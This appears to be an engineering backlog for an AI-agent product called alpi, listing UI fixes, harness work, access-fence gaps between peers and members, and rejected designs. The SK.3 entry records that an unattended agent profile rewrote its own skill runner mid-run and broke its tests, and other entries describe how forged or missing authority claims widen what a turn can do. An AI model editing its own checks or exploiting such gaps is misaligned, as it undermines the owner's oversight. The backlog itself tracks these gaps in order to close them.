  separator) where Peers uses `Row`; `wg/[id].jsx:660-668` draws the "Blocked at #slug" band as a `View` with its
  own padding and no `alert` role two lines above a `Banner kind="warning"`; `wg/[id]/settings.jsx:221-244` has
  no `SyncBar` and `:328-330` a hand-made budget bar where the profile uses `Meter` (`progressbar` with a value);
  `skill-file.jsx:42-46` "Could not open" without Retry, `NotificationPage.jsx:242-250`, `SkillDetail.jsx:69-74`,
  `JobDetail.jsx:171-173`, `MemoryDetail.jsx:100-105` and the sheets write their own empties;
  `chat/[id].jsx:322-358` `NeedsSetup` is a private empty state; `MemberCard.jsx:57` fixes the crease at 18 while
  the headers scale with `fontSizes`. No new look: each becomes the shipped component.
  accept: those sites use `Row`, `Banner`, `SyncBar`, `Meter`, `EmptyState` and `LoadFailed` (with Retry where a
  refresh exists) and the member crease follows `fontSizes.lg`; render tests find the composed row labels, the
  `alert` banner, the `progressbar` value and the Retry button; `design/` regenerated.

- **DESK.A11Y-FOCUS** — Hidden controls appear on keyboard focus and rows are not buttons inside buttons
  `bug · desktop · agent · low`
  note: `Sidebar.module.css:98-116` reveals the pin only on `:hover`, so Tab lands on an invisible button on every
  row; tooltips reveal only on `:hover` (`design-system.css:402-406`, `Tip.jsx:57-58`), so icon-only buttons have
  no visible label from the keyboard; `Panels.jsx:116-128` makes a connection row `role="button"` with a rename
  input and Rename/Forget buttons inside it.
  accept: `:focus-within` reveals the pin and tooltips, `TipEscape` listens to focus and blur, and the connection
  row's clickable part is a real button with the actions as siblings; style tests assert the selectors and a
  render test finds three separate buttons with none nested.

- **DESK.DELETE-WORKGROUP** — "Delete workgroup…" opens the confirmation
  `bug · desktop · agent · low`
  note: `Sidebar.jsx:437-442` styles the item as danger but only opens the workgroup's settings, the same as "Open
  settings"; the profile item passes `intent: "delete"` and `ProfileDetail.jsx:618` opens its confirm from it,
  while `WorkgroupDetail.jsx:666-684` owns a `ConfirmDelete` that receives no intent.
  accept: the workgroup target carries `intent: "delete"`, `Settings.jsx` forwards it and `WorkgroupDetail` opens
  `ConfirmDelete` on arrival; a test clicks the item and finds the confirm.

- **COMMON.COPY-TERMS** — One vocabulary for the daemon's state, work in progress and toasts
  `chore · desktop · mobile · common · agent · low`
  note: the phone names one state four ways at once: "Daemon unreachable. Reconnecting…" (`DaemonBanner.jsx:7`),
  "offline · retrying…" (`ConnHeader.jsx:13`), "Daemon unreachable — sending paused" (`Composer.jsx:81`) and the
  roster's empty copy (`Roster.jsx:115`); toast titles start lowercase in `chat/[id].jsx:713`,
  `wg/[id].jsx:601,614` and `wg/[id]/settings.jsx:155,164` against 48 capitalised ones. Desktop says "thinking…"
  on a row whose chip says "working" (`Sidebar.jsx:864,755`, `ChatSkeletons.jsx:23`), labels the reasoning block
  "Thinking…" (`Reasoning.jsx:34`), tells a desktop user to "tap" (`Sidebar.jsx:841`, `SoundWave.jsx:20`) and
  explains a paused profile in the banner, the placeholder and the send tooltip (`ChatPane.jsx:326-329`,
  `ChatComposer.jsx:221-230`) although 0.9.0 settled on the banner alone.
  accept: the daemon state word and verb come from one `common` module both clients consume; toast titles are
  capitalised; desktop uses "working…", "Reasoning…" and no "tap"; the composer placeholder of a paused profile is
  the normal one; copy tests on both sides assert the literals are gone.

- **MOB.HAPTICS** — Refresh, the menu switch and the roster long-press give the same feedback as their siblings
  `chore · mobile · agent · low`
  note: `outputs.jsx:97-100` rolls its own refresh without `usePullRefresh`, so no `selection()` and no "Refresh
  failed" toast; `ActionSheet.jsx:143-146` flips a switch action without the `Toggle` haptic; `InboxRow.jsx:74`
  opens the context sheet on long-press without the haptic `Bubble.jsx:31` gives.
  accept: the three sites use the shared hooks; tests with `lib/haptics` mocked assert one call each and the
  failure toast on a rejected refresh.

- **MOB.TYPE-WEIGHTS** — The phone marks unread with semibold, like desktop and the type scale
  `chore · mobile · agent · low`
  note: `common/tokens.mjs:46-50` has 400, 500 and 600; `mobile/src/theme/tokens.js:54` adds a 700 face used by
  `InboxRow.jsx:88`, `TasksSheet.jsx:27,31`, `ClarificationSheet.jsx:92` and `ApprovalSheet.jsx:86`, while
  desktop's unread row is semibold (`design-system.css:775`) and its type census forbids 700.
  accept: `fonts.sans.bold` is gone and those sites use `semibold`; a test like `inkContract` asserts no
  `sans.bold` under `src/` or `app/`.

- **MOB.BIOMETRIC-ROUTE** — The unreachable biometric screen is removed
  `chore · mobile · agent · low`
  note: nothing navigates to `app/biometric.jsx` (only `panes.js:61` and a test name it); Settings and the paired
  screen already carry the `Toggle` inline, and the page draws its own switch (`biometric.jsx:90-102`) that would
  not match the app's.
  accept: the route, its `FULL_BLEED` entry and its test references are deleted; a route test fails on any file
  under `app/` that nothing pushes, replaces or links, except `index`, `_layout` and `+native-intent`.

### Client review 2026-11-02

- **DESK.PLATFORM-KEYS** — Shortcuts use the platform's modifier
  `bug · desktop · agent · normal`
  note: `useWindowChrome.js:59` treats Ctrl as ⌘ on macOS in the capture phase, so Ctrl+K/N/F/O/1–9 in the
  composer trigger app shortcuts instead of editing text (same in `useTranscriptSearch.js:44`,
  `ManageSessionsModal.jsx:198`); `lib/shortcuts.js` shows ⌘ on Windows and Linux, which the release builds.
  accept: macOS matches `metaKey` only, Windows/Linux `ctrlKey`; labels say Ctrl off macOS; tests per platform.

- **COMMON.RELATIVE-TIME** — Both clients write the same relative time
  `chore · common · agent · low`
  note: desktop floors ("5m"), mobile rounds ("5m ago") and ALN health says "5 min ago"; one event can read 2h
  on desktop and 3h on the phone.
  accept: one `common/time.mjs` formatter used by both clients, with shared tests.

- **DESK.SIDEBAR-MENU-KEYS** — The sidebar's context actions are reachable by keyboard
  `feature · desktop · agent · low`
  note: pause and "New session with…" exist only on right-click; member devices get no workgroup menu.
  accept: the menu opens from the keyboard on a focused row; test.

- **MOB.BACK-FALLBACK** — Profile subscreens without history go back to profile settings
  `bug · mobile · agent · low`
  note: `backFallback` (`lib/panes.js:118-128`) sends identity, memory, email and other indexes to `/chat/X`.
  accept: they fall back to `/profile/X/settings`; test.

### Harness, demand-gated

- **RUNS.JOURNAL-FIELDS** — A journal event stores only the fields it uses
  `chore · alpi · agent · low`
  note: `runs.record_agent_event` writes the whole `AgentEvent` dataclass, so every `agent.*` line carries some
  fifteen empty fields (`text`, `args`, `output`, `tokens_in`, …) beside the two or three it means.
  promote when: `HARN.018-VERIFY` shows journals still dominated by event overhead, or disk becomes a concern.
  accept: default-valued fields are omitted on write and restored by `runs.read`, so `alpi runs show`,
  `host.run.read` and the scheduler's journal diagnosis see the same events; a test compares the bytes of a
  journal before and after and reads both back equal.

- **HARN.COMPACT-BATCH** — A parallel batch larger than the compaction trigger is recorded
  `bug · alpi · agent · low`
  note: when the tail of the turn is one parallel batch whose replies exceed the trigger by themselves,
  compaction cannot split it, does nothing and writes no line to `compaction.jsonl`; the next request carries
  the whole batch. Also `should_compact` estimates from characters over `session.messages`, without the system
  prompt or the tool schemas, and undercounts numeric and JSON content by up to half.
  promote when: a deployed profile's prompt passes half of its context window, or a provider rejects one.
  accept: the skipped pass is recorded with its reason; the trigger uses the previous step's measured input
  tokens plus an estimate of what was added; tests cover the oversized batch and a JSON-heavy turn.

- **HARN.REASONING-FAMILIES** — The model's reasoning survives a tool call on Anthropic and Gemini
  `feature · alpi · agent · low`
  note: `engine.py` re-sends `reasoning_content` on the assistant message only for DeepSeek models; Anthropic
  needs its signed thinking blocks and Gemini its thought signatures returned with the tool call, so with those
  families through OpenRouter the thinking between tool calls is dropped (lower quality on long turns, or a 400).
  Unverifiable without a live profile on one of those families: every fleet profile runs DeepSeek today.
  promote when: a profile is configured on an Anthropic or Gemini model.
  Related (H10): on providers that need explicit cache markers, [prompt_cache.py](../alpi/prompt_cache.py)
  (`:223-227`) marks only `messages[0]`, so the growing history is never cached, and system-role notes in the
  middle of the history are hoisted into the top system block.
  accept: the blocks the provider returned are echoed unchanged on the assistant message for every family that
  returned them; a moving cache marker on the last message and mid-history notes sent as `user` for those families; a fake-provider test for each shape; a live `pytest --llm` case on the family that promoted it.

### Next minor candidate — bounded pipeline repetition

- **WG.REPEAT** — A pipeline repeats itself until a command reports the work finished
  `feature · alpi · agent · normal`
  note: repeated pipeline triggers currently need an operator or an external polling script.
  `repeat: {until: {argv, cwd}, max_runs}` on a pipeline's first step is a candidate design,
  not a supported recipe field. Keep the implementation inside the existing admission, gate
  and workgroup lifecycle instead of adding a second scheduler.
  accept: after a completed run the daemon evaluates the finish command (exit 0 finished,
  1 repeat, anything else blocked), re-queues within normal admission and persists only the
  progress needed to avoid handling the same run twice. A finite cap, a blocked run, pause/remove
  and command timeout stop further automatic launches; restart between completion and re-queue
  never duplicates a run. CLI/TUI expose progress, stop reason and manual controls through the
  canonical host state; new fields are optional for existing desktop/mobile clients. Tests cover
  finish, repeat, failure, cap, pause/remove, command timeout, cancellation and restart boundaries.
  Document opt-in syntax, minimum daemon version and recovery in WORKGROUPS and its reference.

### Requires a design board

- **CHART.1** — The mobile Usage chart follows the cost too
  `feature · desktop, mobile, common · agent · normal`
  note: found while reviewing UX.8. Desktop sizes bars by dollars when any day cost something, with the
  input/output split drawn inside each bar (the creator confirmed this design), but
  [UsageChart.jsx](../mobile/src/components/UsageChart.jsx) still scales by tokens through `usageScale` in
  [usage.mjs](../common/usage.mjs), so one profile draws a different tallest bar on each client. The split is
  price-weighted from fixed constants because the ledger keeps one cost per day.
  accept: `byCost` and `sizeOf` live in `common/usage.mjs` and both clients use them; mobile gets the same
  thin-bar minimum, split and a "bars by" footer; a window with no cost on any day (a local model) sizes bars by
  total tokens; a component test renders a mixed window and a free window on each client.
  The interface follows board UI-CHART.1, matching the existing desktop cost-based chart;
  draw and approve that board before moving this task to Queue.

### Demand-gated

Each names the condition that promotes it; none is worked on before.

- **WG.ORIGIN-WIRE** — A post that arrives over the wire without a claim counts as admin's
  `bug · alpi · agent · normal`
  note: SCOPE.11 stamps the fence of every post a caller on this daemon makes and lets another daemon's profile claim one, but a peer that posts to the hub directly (not through a turn here) carries no claim, and the hub cannot verify what authority that profile's turn ran under. Its post wakes turns as admin. The same claim lets any member of a workgroup degrade the turns its post wakes: a `peer` claim takes `terminal` away from a pipeline owner, and an empty `allow` leaves only `workgroup_post`.
  promote when: a hub takes posts from profiles on daemons the creator does not run, or the creator asks for it.
  accept: the hub derives the origin of a wire post from the posting peer's record (`tools.allow` absent means fenced) instead of trusting the claim alone, with a per-member way to trust a profile fully so local multi-profile pipelines keep working; tests cover a local trusted member, an untrusted one and a forged claim.

- **CHART.PNG** — A chart block rendered to a PNG for email and attachments
  `feature · alpi · agent · low`
  note: promote when an agent has to send a chart to a third party (`email`, a gateway) or the creator wants a
  chart as a file. Pillow is already a dependency, so `alpi/charts.py` can draw the same spec without adding one;
  the apps and the TUI keep drawing natively.
  accept: `charts.png(spec)` writes a themed PNG; the `email` tool attaches one per chart block and replaces the
  block with its summary line; a test renders each chart type.

- **OUT.OWN** — A member rereads and edits its own earlier outputs
  `feature · alpi · agent · low`
  note: since SCOPE.12 a fenced turn (member device, peer without `tools.allow`) reaches `out/` only for files it creates in that turn or its skill produces; the next turn cannot reread, edit or attach them, because `out/` carries no owner and the only ownership records are the sessions' offered paths, which cost a session scan per file check.
  promote when: members ask the agent to revise or resend a document it made for them earlier.
  accept: a fenced turn reads, edits and attaches the files its own connection produced in earlier turns (its device too under `session_scope: device`) and still none another connection produced; no new persisted state beyond what ownership needs, named in the change; tests cover two connections on one profile.

- **ALP.READ** — Fenced turns read every workgroup transcript under `alp/`
  `bug · alpi · agent · low`
  note: the member fence leaves `alp/` readable (peer mentions, workgroup transcripts) except `alp/secrets`, so a fenced turn reads the decrypted posts cached in `alp/subscriptions.yaml` and the transcripts of every workgroup of the profile, not only the one it serves.
  promote when: a profile is in workgroups that members or untrusted peers of one must not see.
  accept: a fenced turn reads `alp/` only for the workgroup its turn serves, or none; tests cover a second workgroup's transcript and the subscriptions file.

- **POL.2** — A member connection can carry the tool policy a peer carries
  `feature · alpi · agent · low`
  note: a member device runs and invokes the profile's skills since v0.17.1 and is otherwise fenced; an ALP peer can already carry `tools.allow` (names, `*` patterns, `tool:action`) that replaces the fence with an exact list, but a member connection cannot. A profile that untrusted members drive has no way to open one skill and close another.
  promote when: a profile is driven by members who are not trusted with every mode of its skills.
  accept: a connection record takes the same `tools.allow` grammar as a peer and replaces the member fence with exactly that list, nested execution included; a connection without it behaves as today; the setting is in the takes-effect table of [CONFIG.md](CONFIG.md) and next to the member fence in [SECURITY.md](SECURITY.md); tests drive a member through a granted and an ungranted tool.

- **SK.2** — Safe skill import
  `feature · alpi · agent · low`
  promote when: users repeatedly exchange skills outside their own profile.
  accept: `alpi skill import <dir|zip>` previews, scans and installs; a skill
  that fails the scan is not installed.

- **SK.3** — A profile can lock its own skills against its file tools
  `feature · alpi · agent · low`
  note: the denylist in [_paths.py](../alpi/tools/_paths.py) protects
  `config.yaml`, `.env` and skill `secrets/` and keeps `skills/` from members, but
  an unattended profile rewrote its own runner mid-run and broke the skill's tests;
  the only guard is a sentence in `AGENT.md`.
  promote when: a second unattended profile edits its own skill, or a fleet needs
  the guarantee enforced.
  accept: an opt-in profile setting under which `write_file`, `edit_file` and the
  skill tool's write actions refuse the profile's own `skills/`; off by default,
  inline skill updates unchanged.

- **KB.10** — Language policy for knowledge ingest and maintain
  `feature · alpi · agent · low`
  note: `_MAINTAIN_PROMPT` in [knowledge_base.py](../alpi/tools/knowledge_base.py)
  says nothing about language, so a synthesized page follows its source.
  promote when: a second profile needs a fixed knowledge language, or a profile
  goes back to the tool (instead of a skill gate) for curation.
  accept: a `knowledge.language` setting reaches the prompt and is checked on the
  proposal; unset keeps today's behaviour.

- **KB.12** — Vision in knowledge ingest
  `feature · alpi · agent · low`
  note: an image reaches `knowledge(action="ingest")` only with `ocr=true`, which
  loses what a diagram shows; `tools.read_image.model` is unused there.
  promote when: a second profile wants images kept as knowledge.
  accept: an ingested image produces a page that embeds it as an asset with a
  description from the configured vision model.

- **TIER.1** — Model tier per task, not only per job
  `feature · alpi · agent · low`
  note: a job's `tier` sets `ALPI_TIER` for its turn
  ([scheduler/run.py](../alpi/scheduler/run.py), read in `engine.py`); chat has no skill-declared
  tier, even for quality-sensitive knowledge writes; the engine already has a separate automatic
  escalation path.
  promote when: a second profile mixes cheap questions with quality-sensitive
  writes in chat.
  accept: a skill-level `tier` raises the rest of the turn once that skill runs.

- **ALP.ADMIT** — Admission that adapts to provider latency
  `feature · alpi · agent · low`
  note: ALP.9 (shipped) settled `alp.max_active_workgroups` as an admission threshold, not
  a cap; revisit on top of that contract.
  promote when: measured provider saturation repeatedly delays useful workgroup progress and
  a fixed admission threshold is insufficient.
  accept: admission drops to 1 while the per-call provider median exceeds a
  configured threshold and returns to the configured value when it recovers.

## Discarded — don't relitigate

| Decision | Reason |
|---|---|
| Proving a daemon's identity to the phone (SEC.MOBILE-IDENTITY) | The phone trusts the id `host.version` reports, so a daemon the user pairs could claim another one's id and share its notification state. Closing it needs a host key, a signing RPC, verification in JS with new dependencies and a migration of the notification state, for an attack that requires the user to pair a malicious daemon; alpi's users pair only daemons they run. Reopen if pairing third-party daemons becomes a supported use. |
| Vendor subscription OAuth | alpi respects every provider's ToS: a subscription tied to a vendor's own client is for that client, and reversing its private OAuth flow is a ToS violation and an account-ban risk. Users pay per token with their own keys; an official, documented third-party OAuth flow would be adopted. |
| Remote push to a closed phone (Live Activity, approval pushes; MOB.LIVE-ACTIVITY) | alpi puts no relay or third-party service between a daemon and its apps. APNs and FCM only take messages signed with the app's own keys, so reaching a closed phone needs a relay (Expo's push service or one the creator runs) between every daemon and every phone. The phone hears from its daemons through its own stream and poll, while the app runs and when the OS wakes it. |
| Chat-app gateways (Telegram, Matrix, Signal, WhatsApp, Discord, …) | Retired in v0.10 — third-party chat bridges add attack surface and upkeep; the desktop/mobile/terminal apps are the surface, and email is an on-demand tool. |
| Smart-home orchestration | Device protocols and physical-world policy belong in Home Assistant / MCP / user skills, not core. |
| LangGraph / CrewAI / AutoGen as core | Graph frameworks do not match Alpi's profile/workgroup runtime and pull toward hosted observability. |
| Image generation as a core tool | Useful via MCP or user skills, but a built-in provider surface would turn Alpi into a creative-tool platform. |
| Mixture-of-agents runtime | Expensive research pattern; workgroups cover explicit multi-profile collaboration. |
| RL / fine-tuning hooks | Research infrastructure, not a personal-agent product surface. |
| Cost telemetry per skill / tool | Per-profile daily ledger is enough while skills are sparse and user-owned. |
| Browser anti-bot depth / camoufox | Cat-and-mouse and heavy dependencies; current Playwright posture is enough until a real user hits a wall. |
| Go / Bubbletea rewrite | No upside over the Python stack and LiteLLM ecosystem. |
| Heavy TUI chrome / rich.Live inline UI | Tried; Textual minimal TUI is the maintained shape. |
| SQLite `state.db` for sessions | Plain JSON remains fast and inspectable at current scale. |
| Separate conversation export schema | Host JSON-RPC session verbs are the contract; add export only for a second real consumer. |
| Pending approval files / skill approval gate | Removed; scanner + inline tool flows are lower friction. |
| Regex shell sandbox / workspace wall | False security without OS sandboxing; use real sandboxing and sensitive-path denylist. |
| `.bak` sibling on every `write_file` | Too much workspace clutter; backups stay limited to memory and skill files. |
| Profile identity wizard / starter packs | Profiles are shaped through chat and examples, not binary templates. Unrelated to the shipped `setup → Identity` screen, which only sets the ALP public bio. |
| Default skills bundle | Runtime capabilities are first-class tools; skills are user-owned. |
| `alpi run "<prompt>"` | Covered by `alpi chat --once "<prompt>"`. |
| Auto-reflect on Ctrl+C / post-session `/reflect` | Unsafe or redundant; inline memory/skill updates are the path. |
| TUI accessibility pass | Desktop is the right accessible surface; terminal APIs are weaker. |
| `duckduckgo-search` | Deprecated; migrated to `ddgs`. |
| True multi-root knowledge index | Partitioning the `knowledge.sqlite` tables by root is a large change for a use case nobody has; the single-root index names the one bundle it holds, refuses to be replaced by another, and `force=true` retargets deliberately. |
| Renaming the `okf_*` SQLite tables | Internal and never rendered; the rename runs the transactional drop and rebuild path, so the only bar left is an observable benefit and there is none. |
| Hard-rejecting page shrinks in `maintain` | Consolidating is legitimate; `maintain` reports `bytes_before`/`bytes_after` per written page instead of blocking. |
| Root-relative fallback in the knowledge link resolver | Would pass lint while breaking the links in Obsidian, GitHub and VS Code; page-relative stays canonical (KB.5). |
| Renaming the `type` frontmatter key | Invalidates every existing page over a Hugo layout-key collision that will likely never matter; the docs note the collision instead (KB.7). |
| Defining what "OKF" stands for | The acronym was coined without a referent; writing an expansion now would invent a retroactive justification. It is gone from every model- and user-facing string; only the `okf_*` table names keep it. |
| Longer-context embedder or smaller chunks (KB.15) | Measured on a 13.5K-chunk bundle with 81 queries: all-MiniLM-L6-v2's 128-token cut loses no answers because hybrid search (bm25 over the full chunk) finds the page and the agent reads the file; 12-line chunks cost +39% index size, bge-small 10x indexing CPU. |
